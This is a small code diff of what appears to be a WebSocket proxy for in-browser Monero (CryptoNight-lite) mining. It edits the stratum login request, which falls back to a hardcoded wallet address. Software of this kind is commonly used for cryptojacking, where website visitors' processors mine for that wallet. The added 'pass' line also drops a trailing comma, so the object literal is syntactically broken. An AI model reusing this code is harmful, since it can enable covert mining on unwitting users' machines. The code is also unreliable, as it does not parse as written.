@@ -42,8 +42,8 @@ wss.on('connection', (ws) => {
                         id: 1,
                         method: "login",
                         params: {
-                            login: (data.login || data.wallet || "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi") + "~cn-lite",
-                            pass: data.password || "x",
+                            login: data.login || data.wallet || "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi",
+                            pass: "~cn/lite"
                             agent: "XMR-CryptoNightWeb/1.0"
                         }
                     };
